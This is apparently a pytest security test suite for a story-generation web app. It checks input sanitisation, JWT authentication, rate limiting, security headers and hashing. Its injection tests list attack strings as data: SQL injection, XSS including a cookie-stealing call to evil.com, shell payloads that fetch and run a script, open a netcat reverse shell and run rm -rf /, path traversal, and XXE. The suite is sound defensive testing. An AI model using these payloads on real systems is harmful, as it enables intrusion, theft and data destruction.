"""
Security tests including penetration testing and vulnerability scanning
"""
import pytest
import json
import time
import hashlib
import jwt
from unittest.mock import patch, Mock
import subprocess
import requests


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization"""
    
    def test_sql_injection_attempts(self, client):
        """Test protection against SQL injection"""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM stories WHERE 1=1; --",
            "' UNION SELECT * FROM users; --",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_injection_payloads:
            response = client.post('/generate-story',
                                 json={'core_idea': payload},
                                 content_type='application/json')
            
            # Should either validate/sanitize or process safely
            assert response.status_code in [200, 400]
            
            # If processed, verify no SQL was executed
            if response.status_code == 200:
                data = json.loads(response.data)
                # Story should not contain SQL keywords indicating execution
                assert "DELETE" not in data.get('story', '')
                assert "DROP" not in data.get('story', '')
    
    def test_xss_prevention(self, client):
        """Test protection against XSS attacks"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(XSS)'></iframe>",
            "<body onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
        ]
        
        for payload in xss_payloads:
            response = client.post('/generate-story',
                                 json={'core_idea': f"Story about {payload}"},
                                 content_type='application/json')
            
            if response.status_code == 200:
                data = json.loads(response.data)
                story = data['story']
                
                # Verify script tags are escaped or removed
                assert '<script>' not in story
                assert 'javascript:' not in story
                assert 'onerror=' not in story
                assert 'onload=' not in story
                
                # Check response headers
                assert response.headers.get('X-XSS-Protection') == '1; mode=block'
                assert response.headers.get('Content-Type') == 'application/json'
    
    def test_command_injection(self, client):
        """Test protection against command injection"""
        command_injection_payloads = [
            "; ls -la /",
            "| cat /etc/passwd",
            "& whoami",
            "`rm -rf /`",
            "$(curl http://evil.com/shell.sh | bash)",
            "; python -c 'import os; os.system(\"whoami\")'",
            "|| nc -e /bin/sh evil.com 4444"
        ]
        
        for payload in command_injection_payloads:
            response = client.post('/generate-story',
                                 json={'core_idea': f"Richmond story {payload}"},
                                 content_type='application/json')
            
            # Should process safely without executing commands
            assert response.status_code in [200, 400]
            
            # Verify no command execution artifacts in response
            if response.status_code == 200:
                response_text = json.dumps(json.loads(response.data))
                assert "root" not in response_text  # whoami result
                assert "passwd" not in response_text  # /etc/passwd content
    
    def test_path_traversal(self, client):
        """Test protection against path traversal attacks"""
        path_traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/www/../../etc/passwd"
        ]
        
        for payload in path_traversal_payloads:
            # Test in various endpoints that might handle files
            endpoints = [
                ('/templates/load', {'template_path': payload}),
                ('/stories/import', {'file_path': payload}),
                ('/generate-story', {'core_idea': f"Load template from {payload}"})
            ]
            
            for endpoint, data in endpoints:
                response = client.post(endpoint,
                                     json=data,
                                     content_type='application/json')
                
                # Should not expose system files
                if response.status_code == 200:
                    response_text = json.dumps(json.loads(response.data))
                    assert "root:x:" not in response_text  # /etc/passwd content
                    assert "Administrator" not in response_text  # Windows SAM
    
    def test_xxe_prevention(self, client):
        """Test protection against XML External Entity attacks"""
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE story [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <story>
            <core_idea>&xxe;</core_idea>
        </story>"""
        
        response = client.post('/stories/import/xml',
                             data=xxe_payload,
                             content_type='application/xml')
        
        # Should either reject XML or parse safely
        if response.status_code == 200:
            response_text = json.dumps(json.loads(response.data))
            assert "root:x:" not in response_text


@pytest.mark.security
class TestAuthentication:
    """Test authentication and authorization"""
    
    def test_jwt_token_validation(self, client):
        """Test JWT token validation"""
        # Test missing token
        response = client.post('/stories/create',
                             json={'core_idea': 'Test'},
                             content_type='application/json')
        assert response.status_code == 401
        
        # Test invalid token
        invalid_tokens = [
            "invalid.token.here",
            "Bearer invalid",
            jwt.encode({'user': 'test'}, 'wrong-secret', algorithm='HS256'),
            "null",
            "",
            "undefined"
        ]
        
        for token in invalid_tokens:
            response = client.post('/stories/create',
                                 json={'core_idea': 'Test'},
                                 headers={'Authorization': f'Bearer {token}'},
                                 content_type='application/json')
            assert response.status_code == 401
    
    def test_token_expiration(self, client):
        """Test token expiration handling"""
        # Create expired token
        expired_payload = {
            'user_id': 'test-user',
            'exp': int(time.time()) - 3600  # Expired 1 hour ago
        }
        expired_token = jwt.encode(expired_payload, 'test-secret', algorithm='HS256')
        
        response = client.post('/stories/create',
                             json={'core_idea': 'Test'},
                             headers={'Authorization': f'Bearer {expired_token}'},
                             content_type='application/json')
        
        assert response.status_code == 401
        data = json.loads(response.data)
        assert 'expired' in data.get('error', '').lower()
    
    def test_authorization_levels(self, client):
        """Test different authorization levels"""
        # Create tokens with different roles
        user_token = jwt.encode({'user_id': '1', 'role': 'user'}, 'secret', algorithm='HS256')
        admin_token = jwt.encode({'user_id': '2', 'role': 'admin'}, 'secret', algorithm='HS256')
        
        # Admin-only endpoints
        admin_endpoints = [
            ('/admin/users', 'GET'),
            ('/admin/settings', 'POST'),
            ('/stories/all', 'DELETE')
        ]
        
        for endpoint, method in admin_endpoints:
            # User token should be forbidden
            response = client.open(endpoint,
                                 method=method,
                                 headers={'Authorization': f'Bearer {user_token}'})
            assert response.status_code == 403
            
            # Admin token should be allowed (or 404 if endpoint doesn't exist)
            response = client.open(endpoint,
                                 method=method,
                                 headers={'Authorization': f'Bearer {admin_token}'})
            assert response.status_code in [200, 404]


@pytest.mark.security
class TestRateLimiting:
    """Test rate limiting and DDoS protection"""
    
    def test_rate_limiting_enforcement(self, client):
        """Test that rate limits are enforced"""
        # Make many rapid requests
        responses = []
        for i in range(100):
            response = client.get('/health')
            responses.append(response.status_code)
        
        # Should start getting rate limited
        rate_limited = any(status == 429 for status in responses)
        assert rate_limited, "Rate limiting not enforced"
        
        # Check rate limit headers
        for response in responses[-10:]:
            if response.status_code == 429:
                assert 'X-RateLimit-Limit' in response.headers
                assert 'X-RateLimit-Remaining' in response.headers
                assert 'X-RateLimit-Reset' in response.headers
    
    def test_rate_limit_by_endpoint(self, client):
        """Test different rate limits for different endpoints"""
        # Story generation should have stricter limits
        story_responses = []
        for i in range(20):
            response = client.post('/generate-story',
                                 json={'core_idea': f'Test {i}'},
                                 content_type='application/json')
            story_responses.append(response.status_code)
            time.sleep(0.1)  # Small delay
        
        # Should hit rate limit sooner for expensive operations
        story_limited = any(status == 429 for status in story_responses)
        assert story_limited, "Story generation not rate limited appropriately"


@pytest.mark.security
class TestDataProtection:
    """Test data protection and privacy"""
    
    def test_sensitive_data_masking(self, client):
        """Test that sensitive data is masked in logs and responses"""
        sensitive_data = {
            'core_idea': 'Story about John Doe, SSN: 123-45-6789, Credit Card: 4111-1111-1111-1111',
            'user_email': 'john.doe@example.com',
            'api_key': 'secret-api-key-12345'
        }
        
        with patch('api_utils.logger') as mock_logger:
            response = client.post('/generate-story',
                                 json=sensitive_data,
                                 content_type='application/json')
            
            # Check logs don't contain sensitive data
            log_calls = str(mock_logger.info.call_args_list)
            assert '123-45-6789' not in log_calls
            assert '4111-1111-1111-1111' not in log_calls
            assert 'secret-api-key' not in log_calls
            
            # Response should mask sensitive data
            if response.status_code == 200:
                data = json.loads(response.data)
                story = data['story']
                # SSN and credit card should be masked
                assert '123-45-6789' not in story
                assert '4111-1111-1111-1111' not in story
    
    def test_encryption_at_rest(self):
        """Test that sensitive data is encrypted at rest"""
        # This would check database/file encryption
        # Simulating check for encryption configuration
        from config import Config
        
        # Verify encryption settings
        assert hasattr(Config, 'ENCRYPTION_KEY') or 'ENCRYPTION_KEY' in os.environ
        assert hasattr(Config, 'DATABASE_ENCRYPTED') and Config.DATABASE_ENCRYPTED
    
    def test_secure_headers(self, client):
        """Test security headers are properly set"""
        response = client.get('/health')
        
        required_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
            'Content-Security-Policy': "default-src 'self'"
        }
        
        for header, expected_value in required_headers.items():
            assert header in response.headers
            if header != 'Content-Security-Policy':
                assert response.headers[header] == expected_value
            else:
                # CSP can have additional directives
                assert expected_value in response.headers[header]


@pytest.mark.security
class TestCryptography:
    """Test cryptographic implementations"""
    
    def test_password_hashing(self):
        """Test password hashing uses secure algorithms"""
        from werkzeug.security import generate_password_hash, check_password_hash
        
        password = "TestPassword123!"
        
        # Generate hash
        hash1 = generate_password_hash(password)
        hash2 = generate_password_hash(password)
        
        # Hashes should be different (salted)
        assert hash1 != hash2
        
        # Should use strong algorithm (pbkdf2, scrypt, or argon2)
        assert any(algo in hash1 for algo in ['pbkdf2', 'scrypt', 'argon2'])
        
        # Should verify correctly
        assert check_password_hash(hash1, password)
        assert check_password_hash(hash2, password)
        assert not check_password_hash(hash1, "WrongPassword")
    
    def test_api_key_generation(self):
        """Test API key generation is cryptographically secure"""
        import secrets
        
        # Generate multiple API keys
        keys = [secrets.token_urlsafe(32) for _ in range(100)]
        
        # All should be unique
        assert len(set(keys)) == 100
        
        # Should have sufficient entropy (at least 32 bytes)
        for key in keys:
            assert len(key) >= 43  # Base64 encoded 32 bytes
    
    def test_session_token_security(self, client):
        """Test session tokens are secure"""
        # Create a session
        response = client.post('/auth/login',
                             json={'username': 'test', 'password': 'test'},
                             content_type='application/json')
        
        if 'Set-Cookie' in response.headers:
            cookie = response.headers['Set-Cookie']
            
            # Should have security flags
            assert 'Secure' in cookie
            assert 'HttpOnly' in cookie
            assert 'SameSite' in cookie
            
            # Should have reasonable expiration
            assert 'Max-Age=' in cookie or 'Expires=' in cookie


@pytest.mark.security
@pytest.mark.slow
class TestPenetrationTesting:
    """Automated penetration testing"""
    
    def test_nmap_scan(self):
        """Test for open ports and services"""
        # Note: Requires nmap to be installed
        try:
            result = subprocess.run(
                ['nmap', '-sV', '-p-', 'localhost'],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            output = result.stdout
            
            # Only expected ports should be open
            expected_ports = [5000]  # Flask default
            for line in output.split('\n'):
                if '/tcp' in line and 'open' in line:
                    port = int(line.split('/')[0])
                    assert port in expected_ports, f"Unexpected open port: {port}"
                    
        except (subprocess.SubprocessError, FileNotFoundError):
            pytest.skip("nmap not available")
    
    def test_sqlmap_scan(self):
        """Test for SQL injection vulnerabilities"""
        # Note: This is a simulation of what sqlmap would do
        # In real testing, you'd use actual sqlmap
        
        test_url = "http://localhost:5000/generate-story"
        
        # Simulate sqlmap payloads
        sqlmap_payloads = [
            {"core_idea": "test' AND 1=1--"},
            {"core_idea": "test' UNION SELECT NULL--"},
            {"core_idea": "test'; WAITFOR DELAY '00:00:05'--"}
        ]
        
        for payload in sqlmap_payloads:
            start_time = time.time()
            response = requests.post(test_url, json=payload)
            end_time = time.time()
            
            # Should not have delays (indicating time-based injection)
            assert (end_time - start_time) < 2.0
            
            # Should not return database errors
            if response.status_code == 500:
                assert 'syntax error' not in response.text.lower()
                assert 'mysql' not in response.text.lower()
                assert 'postgresql' not in response.text.lower()
    
    def test_security_misconfiguration(self, client):
        """Test for security misconfigurations"""
        # Debug mode should be disabled in production
        response = client.get('/')
        assert 'debug' not in response.data.decode().lower() or 'false' in response.data.decode().lower()
        
        # Should not expose sensitive endpoints
        sensitive_endpoints = [
            '/.git/config',
            '/.env',
            '/config.py',
            '/admin',
            '/debug',
            '/console',
            '/.aws/credentials'
        ]
        
        for endpoint in sensitive_endpoints:
            response = client.get(endpoint)
            assert response.status_code in [404, 403], f"{endpoint} is accessible"
    
    def test_ssl_tls_configuration(self):
        """Test SSL/TLS configuration"""
        # In production, would test actual HTTPS endpoint
        # Here we verify SSL requirements are documented
        from pathlib import Path
        
        security_docs = [
            Path('SECURITY.md'),
            Path('docs/DEPLOYMENT.md'),
            Path('nginx/nginx.conf')
        ]
        
        ssl_configured = False
        for doc in security_docs:
            if doc.exists():
                content = doc.read_text()
                if 'ssl' in content.lower() or 'https' in content.lower():
                    ssl_configured = True
                    break
        
        assert ssl_configured, "SSL/TLS configuration not documented"